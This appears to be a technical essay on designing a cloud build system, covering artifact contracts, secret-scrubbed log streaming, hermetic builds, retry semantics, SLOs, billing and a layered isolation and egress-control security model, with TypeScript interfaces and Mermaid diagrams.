Workers produce output. The shape of that output varies wildly—a static-site generator emits a directory of HTML and CSS, a Node.js server build produces a bundled JavaScript file, a container build produces an OCI image, a serverless build produces a zip file of functions. Your deployment system needs to consume all of these, which means the build system needs to normalize them.

The **build output contract** defines what the deployment system expects: a manifest describing the output type and structure, plus the output files themselves. The build system's job is to take whatever the customer's build produces and package it according to this contract.

```typescript title="build-artifact.ts"
interface BuildArtifact {
  // [!note Content-addressing gives you deduplication and integrity verification for free.]
  contentHash: string;
  outputType: 'static' | 'server' | 'container-image' | 'function';
  source: {
    repositoryUrl: string;
    commitSha: string;
    branch: string;
  };
  build: {
    command: string;
    duration: number;
    exitCode: number;
    builderVersion: string;
    environmentHash: string;
  };
  files: {
    path: string;
    size: number;
    hash: string;
  }[];
  createdAt: Date;
}
```

**Content-addressable storage** means you store artifacts by their content hash, not by build ID or timestamp. If two builds produce byte-identical output (which happens more often than you'd expect, especially with caching), you store one copy and reference it twice. Integrity verification is built in—if the hash of the stored artifact doesn't match the key, the storage is corrupted or tampered with.

Artifact **retention** is a cost problem. Storing every artifact from every build forever is expensive and usually unnecessary. A reasonable policy keeps the most recent N artifacts per branch, all artifacts referenced by active deployments, and garbage-collects the rest. Customers with compliance requirements may need longer retention, which becomes a billing dimension.

## Build logs as a first-class system

Logs are the primary debugging interface for both customers and operators. When a build fails, the first thing a customer does is read the logs. When something goes wrong at the platform level, the first thing an operator does is read the logs. Getting logs right is worth the investment.

**Streaming** is non-negotiable. Customers need to see build output in real time—not after the build finishes. This requires a streaming transport from worker to control plane to client. WebSockets and Server-Sent Events both work. The worker writes stdout/stderr to a local buffer and streams it to the control plane over a persistent connection. The control plane fans out to any connected clients watching that build.

```typescript title="log-entry.ts"
interface LogEntry {
  timestamp: Date;
  buildId: string;
  phase: 'source-fetch' | 'dependency-install' | 'build' | 'artifact-upload';
  stream: 'stdout' | 'stderr' | 'system';
  content: string;
  metadata?: {
    cacheHit?: boolean;
    duration?: number;
    exitCode?: number;
  };
}
```

**Structured logging** means that raw stdout/stderr from the build is interleaved with system events: phase transitions ("Starting dependency install..."), cache events ("Cache hit for @app/shared, skipping build"), and timing data ("Build completed in 42.3s"). These system events use the `system` stream to distinguish them from customer output.

```typescript title="log-scrubber.ts"
function scrubSecrets(line: string, knownSecrets: Set<string>): string {
  let scrubbed = line;

  for (const secret of knownSecrets) {
    if (secret.length < 8) continue;
    scrubbed = scrubbed.replaceAll(secret, '***');
  }

  scrubbed = scrubbed.replace(/(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}/g, '***');
  scrubbed = scrubbed.replace(/AKIA[0-9A-Z]{16}/g, '***');
  scrubbed = scrubbed.replace(/Bearer\s+[A-Za-z0-9\-._~+/]+=*/g, 'Bearer ***');

  return scrubbed;
}
```

The scrubber runs inside the worker, at the boundary between the sandbox and the log transport. This is important—if you scrub after the log leaves the worker, there's a window where unscrubbed logs exist outside the isolation boundary. Scrub first, stream second.

**Retention** follows a tiered model. Recent build logs (last 7–30 days) are stored in hot storage for fast retrieval. Older logs move to cold storage (object storage with higher latency but lower cost). Logs older than the retention period are deleted. For most builds, logs are never read after the first few hours. The tiered model optimizes for this access pattern.

## Provenance, reproducibility, and deployment handoff

Together, the artifact and its metadata form the **provenance record**—a complete accounting of what inputs produced what outputs. The provenance record answers the question: "This artifact that's running in production—where did it come from, and can I produce it again?"

**Reproducibility** means that given the same inputs, you can produce the same output. Perfect reproducibility is hard—timestamps in build output, non-deterministic compiler optimizations, and floating dependency versions all conspire against it. **Hermetic builds**—where the build has no network access and all dependencies are pre-fetched—get closest. The dependency install phase resolves and caches everything, then the build phase runs with network disabled, using only what's already on disk. This eliminates the class of non-reproducibility caused by external state changing between builds.

Non-hermetic builds are more convenient (and sometimes necessary—some build tools insist on fetching things at build time), but harder to reproduce exactly. The tradeoff is worth documenting in your provenance record: flag whether a build was hermetic, and if not, record the external resources it accessed.

The **deployment handoff** is where the build system's responsibility ends and the deployment system's begins. The interface between them should be clean and narrow: the build system produces an artifact (stored by content hash) and a metadata record (provenance, output type, file manifest). The deployment system receives a notification with the artifact reference and decides what to do with it.

```mermaid
sequenceDiagram
    participant Worker as Build Worker
    participant Store as Artifact Storage
    participant State as State Store
    participant Deploy as Deployment System

    Worker->>Store: Upload artifact (by content hash)
    Worker->>State: Write provenance record
    Worker->>State: Update build status: succeeded
    State->>Deploy: Notify: artifact ready
    Deploy->>Store: Fetch artifact
    Deploy->>Deploy: Deploy to target environment
```

Resist the temptation to collapse build and deploy into a single system. They have different scaling characteristics (builds are CPU-intensive; deploys are I/O-intensive), different failure modes (a build failure is the customer's problem; a deploy failure is your platform's problem), and different security postures (builds run untrusted code; deploys should not). A clean interface between them lets each system evolve independently.

## Retries, idempotency, and failure recovery

Builds fail. Workers crash. Networks partition. Disks fill up. The question isn't whether failures happen—it's how the system behaves when they do.

The first distinction is between **retryable** and **non-retryable** failures. A build that exits with a non-zero status code is a user code failure—the customer's build script has a bug, and retrying won't help. A worker that stops sending heartbeats is an infrastructure failure—the VM crashed, the host went down, or the network partitioned. Infrastructure failures are retryable; user code failures are not.

```mermaid
stateDiagram-v2
    [*] --> Queued
    Queued --> Provisioning: Worker assigned
    Provisioning --> Running: Sandbox ready
    Running --> Extracting: Build completed
    Extracting --> Succeeded: Artifacts stored
    Running --> Failed: Non-zero exit code
    Running --> Failed: Timeout exceeded
    Provisioning --> Queued: Infra failure + retries remaining
    Running --> Queued: Heartbeat lost + retries remaining
    Running --> Failed: Heartbeat lost + no retries
    Queued --> Cancelled: User cancelled
    Running --> Cancelled: User cancelled
```

The state machine has two paths back to `Queued`: infrastructure failures that are eligible for retry. Each build tracks its retry count, and there's a maximum (typically 2–3 retries). After the maximum, the build is marked as failed with a clear indication that it was an infrastructure failure, not a code failure. Customers need to know the difference—"your build failed because your code has a bug" requires a different response than "your build failed because our infrastructure had a problem, and we're retrying it."

**Idempotency** means that running the same build twice produces the same result—or at least doesn't produce a corrupted result. This is straightforward when builds are pure transformations (source in, artifact out), but gets complicated when builds have side effects. If a build publishes a package to a registry as part of its pipeline, retrying a partially-completed build might publish the same version twice. If the build sends a webhook notification, the recipient gets duplicate notifications. The build system can't solve all of these—some require the customer to design their build for idempotency—but it can avoid making things worse by ensuring that artifact writes are atomic (write to a temporary location, then rename) and that status updates are idempotent (setting a build to "succeeded" twice is the same as setting it once).

**Crash recovery** on the control plane side relies on heartbeats. Workers send periodic heartbeats to the control plane. If the control plane stops receiving heartbeats for a configurable timeout (30–60 seconds), it assumes the worker is dead, marks the build as failed (or retryable), and cleans up any partial state. The state store must survive control plane restarts—builds in progress should resume supervision after a control plane restart, not be silently dropped.

## SLOs and the metrics that matter

With the system running, you need to know whether it's running _well_. SLOs (service level objectives) define "well" in measurable terms.

The metrics that matter for a build system fall into two categories: things you control and things you don't. **Queue wait time**—the time from when a build is requested to when it starts executing—is entirely under your control. It's a function of queue depth, worker capacity, and scheduling efficiency. **Build duration**—the time from when a build starts to when it finishes—depends mostly on the customer's code. You control the machine it runs on and the I/O speed, but a customer who runs a 45-minute Webpack build is going to have a 45-minute build regardless of your infrastructure.

This means you need separate SLOs for each.

| Metric                      | Target  | Window           |
| --------------------------- | ------- | ---------------- |
| Queue wait time (p50)       | < 5s    | Rolling 7 days   |
| Queue wait time (p99)       | < 30s   | Rolling 7 days   |
| Infrastructure failure rate | < 0.1%  | Rolling 30 days  |
| Build start availability    | 99.9%   | Rolling 30 days  |
| Artifact storage durability | 99.999% | Rolling 365 days |
| Log delivery completeness   | 99.9%   | Rolling 30 days  |

The p99 matters more than the p50 for build systems. Customers remember the time they waited two minutes for a build to start, not the average five-second wait. If your p50 is great but your p99 is terrible, you have a capacity planning problem—likely not enough warm workers to absorb demand spikes.

**Capacity planning** works backward from SLOs. If your p99 queue wait target is 30 seconds and your peak arrival rate is 100 builds per minute, you need enough worker capacity to absorb 100 builds within 30 seconds of arrival. Factor in build duration (longer builds mean workers are occupied longer), failure rates (failed builds consume capacity without producing output), and autoscaling lag (new workers take time to provision). Over-provisioning the warm pool is expensive; under-provisioning it violates your SLOs.

## Billing and resource accounting

SLOs tell you what to promise. Billing tells you what to charge for—and those two things need to be consistent. You can't promise a p99 queue wait of 30 seconds and then charge customers in a way that incentivizes them to run all their builds at the same time.

The **billable dimensions** for a build system are compute time, bandwidth, and storage. Compute time is the big one—it represents the actual cost of running the customer's code on your infrastructure. Bandwidth covers network egress during dependency installation. Storage covers artifact retention and cache usage.

```typescript title="build-usage.ts"
interface BuildUsageRecord {
  buildId: string;
  customerId: string;
  computeTimeSeconds: number;
  peakMemoryBytes: number;
  egressBytes: number;
  artifactSizeBytes: number;
  cacheReadBytes: number;
  cacheWriteBytes: number;
  timestamp: Date;
}
```

The **"build minute"** is the common billing unit—one minute of compute time on a standard machine type. It's imprecise (a minute on a 2-core machine is different from a minute on a 16-core machine, and a CPU-bound build uses resources differently than an I/O-bound one), but it's simple for customers to understand and predict. More granular billing (per-CPU-second, per-GB-RAM-hour) is fairer but harder to reason about.

**Free tier design** deserves thought. A generous free tier drives adoption, but if the free tier is _too_ generous, your largest cost center becomes customers who never pay. Common approaches: limit free-tier builds to a lower concurrency cap (1 concurrent build instead of 10), a shorter timeout (10 minutes instead of 45), and a smaller cache quota. The goal is that free-tier usage gives customers a genuine experience of the product while keeping costs bounded.

## Debugging workflows

The system is running, the metrics look good, and then a customer opens a support ticket: "My build worked yesterday and fails today. Nothing changed." This is where your debugging infrastructure earns its keep.

**Customer-facing debugging** starts with the build logs. Phase markers ("dependency install started," "build started," "build completed in 34.2s") let the customer narrow down where the failure happened. Cache hit/miss indicators show whether a previously-fast step got slower because the cache was invalidated. Error classification—explicitly labeling a failure as "infrastructure error, retrying" vs. "build command exited with code 1"—tells the customer whether they need to fix their code or just retry.

The hardest customer-facing debugging problem is reproducibility. "It works on my machine" is just as real in build systems as it is in local development. Giving customers the ability to reproduce their build locally—by providing the exact builder image version, environment variables (minus secrets), and build command—turns "works on my machine" into "works on the same machine the build ran on."

**Operator-facing debugging** requires a different set of tools. Distributed tracing—where a single build's lifecycle is tagged with a correlation ID that spans the API request, the scheduler decision, the worker execution, the artifact upload, and the deployment notification—lets operators follow a build's path through the system. Queue depth dashboards show whether capacity is keeping up with demand. Worker health monitoring identifies hosts that are producing an unusual number of failures.

> [!TIP] Correlation IDs
> A single ID that follows a build from API request through worker execution through artifact storage through deployment notification is the most valuable debugging tool in the system. Without it, correlating "this API request" with "that worker log" with "this artifact upload" requires timestamp-based guesswork across multiple log sources.

Audit trails matter for security events. When secrets are accessed, log which build accessed which secret at what time. When egress is blocked, log the destination that was attempted. When a build hits a resource quota, log the resource and the limit. These logs are distinct from build logs—they're operator-facing and potentially security-sensitive, so they go to a separate store with different access controls and retention policies.

## The full picture

Stepping back, the system we've designed has a clear shape. A trusted control plane accepts build requests, schedules them to ephemeral workers, and manages the lifecycle. Untrusted workers run inside isolation boundaries—each with its own kernel, its own filesystem, its own network namespace—and produce two things: an artifact (stored by content hash) and a stream of logs (scrubbed and streamed in real time).

```mermaid
graph TD
    User["Customer"] -->|"push / deploy trigger"| API["API Gateway"]

    subgraph "Control Plane"
        API --> Auth["Auth + Validation"]
        Auth --> Scheduler["Scheduler"]
        Scheduler --> Queue["Priority Queue"]
        Scheduler --> State["State Store"]
        State --> Notifier["Deploy Notifier"]
    end

    subgraph "Secrets Infrastructure"
        SM["Secrets Manager"]
    end

    subgraph "Build Workers"
        Queue --> W["Worker Pool Manager"]
        W --> VM1["MicroVM Worker"]
        W --> VM2["MicroVM Worker"]
        W --> VMN["MicroVM Worker"]
    end

    SM -->|"phase-scoped injection"| VM1
    SM -->|"phase-scoped injection"| VM2

    subgraph "Egress Control"
        VM1 --> Proxy["Egress Proxy"]
        VM2 --> Proxy
        VMN --> Proxy
        Proxy -->|"allow-listed"| Internet["Package Registries"]
    end

    subgraph "Storage"
        VM1 -->|"artifacts"| AS["Artifact Store<br/>(content-addressed)"]
        VM1 -->|"scrubbed logs"| LS["Log Store<br/>(tiered)"]
        VM1 -->|"cache writes"| CS["Cache Store<br/>(content-addressed)"]
        CS -->|"cache reads"| VM2
    end

    Notifier -->|"artifact ref"| Deploy["Deployment System"]
    Deploy --> AS
```

The security model works as concentric rings. The outermost ring is the isolation boundary—each build in its own microVM with its own kernel. Inside that, the network boundary—egress filtered through a proxy, metadata service blocked. Inside that, the secrets boundary—credentials injected only during the phase that needs them, scrubbed from logs before they leave the sandbox. Inside that, the resource boundary—CPU, memory, disk, and process limits enforced by the kernel's cgroup and namespace controls.

Each ring assumes the one outside it might fail. If the network filter has a bug, the isolation boundary still prevents cross-tenant access. If the isolation boundary has a vulnerability, the network filter still prevents data exfiltration to arbitrary destinations. If secrets leak into logs, the scrubber catches them before logs leave the worker. Defense in depth means exactly this: no single failure compromises the system.

The hard problems in this system are all at boundaries. The boundary between trusted and untrusted code (the isolation model). The boundary between build and deploy (the artifact contract). The boundary between speed and safety (caching vs. cache poisoning, network access vs. egress control, convenience vs. lockdown). The design decisions are tradeoffs, not solutions, and the right answer depends on your threat model, your SLOs, and your customers. But the shape of the system—trusted control plane, ephemeral untrusted workers, content-addressed storage, layered security boundaries—is remarkably consistent across implementations. The constraints push you toward it whether you start from the security model or the performance requirements. That convergence is a good sign. It means the design is driven by the problem, not by preference. I learned most of this the hard way—by shipping something that didn't have enough of these layers and finding out which ones mattered at exactly the wrong moment. If the shape of this system looks obvious in retrospect, that's the constraints talking. They're good teachers, even when the lessons are expensive.
